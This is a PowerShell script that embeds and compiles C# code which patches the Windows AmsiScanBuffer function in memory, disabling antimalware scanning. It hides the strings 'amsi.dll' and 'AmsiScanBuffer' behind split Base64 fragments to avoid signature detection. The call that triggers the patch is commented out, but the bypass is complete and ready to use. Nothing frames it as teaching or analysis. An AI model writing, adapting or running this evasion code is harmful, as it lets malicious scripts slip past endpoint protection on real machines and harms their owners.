$Ref = (
"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
"System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
)

$Source = @"
using System;
using System.Runtime.InteropServices;

namespace Bypass
{
    public class AntiMalware
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static int Disable()
        {
            byte[] dllname = System.Convert.FromBase64String("YW1za" + "S5kbGw=");
            string base64DecodedDLLName = System.Text.ASCIIEncoding.ASCII.GetString(dllname);
            IntPtr TargetDLL = LoadLibrary(base64DecodedDLLName);

            byte[] procname = System.Convert.FromBase64String("QW1zaVNjY" + "W5CdWZmZXI=");
            string base64DecodedProcName = System.Text.ASCIIEncoding.ASCII.GetString(procname);

            IntPtr ASBPtr = GetProcAddress(TargetDLL, base64DecodedProcName);
            if (ASBPtr == IntPtr.Zero) { return 1; }

            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;

            if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }

            Byte[] Patch = {0xC3, 0x80, 0x07, 0x00, 0x57, 0xB8};
            Array.Reverse(Patch);

            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
            Marshal.Copy(Patch, 0, unmanagedPointer, 6);
            MoveMemory(ASBPtr, unmanagedPointer, 6);

            return 0;
        }
    }
}
"@

Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp
<#
if([Bypass.AntiMalware]::Disable() -eq "0") {
    Write-Output "AMSI disabled"
}
#>
